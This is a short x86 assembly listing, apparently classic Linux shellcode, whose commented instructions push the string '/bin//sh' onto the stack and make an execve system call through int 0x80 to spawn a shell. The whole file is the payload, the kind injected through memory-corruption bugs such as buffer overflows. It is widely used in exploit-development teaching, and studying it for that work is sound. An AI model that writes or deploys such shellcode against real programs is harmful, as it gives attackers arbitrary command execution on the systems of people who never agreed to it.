global _start

section .text
_start:
        xor     eax,eax     ; zero out eax
        push    eax         ; push execve(,,0)
        push    0x68732f2f  ; push "//sh"
        push    0x6e69622f  ; push "/bin"
        mov     ebx,esp     ; ebx pointing to "/bin//sh"
        push    eax         ; push execve(,0,)
        push    ebx         ; push execve("/bin//sh",,)
        mov     ecx,esp     ; prepare ecx
        mov     al,0xb      ; system call 11 (execve)
        int     0x80        ; execve("/bin//sh",0,0)